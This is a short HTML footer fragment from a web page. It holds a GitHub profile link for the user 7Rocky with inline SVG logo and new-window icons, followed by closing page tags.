<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></div></div></footer></body></html>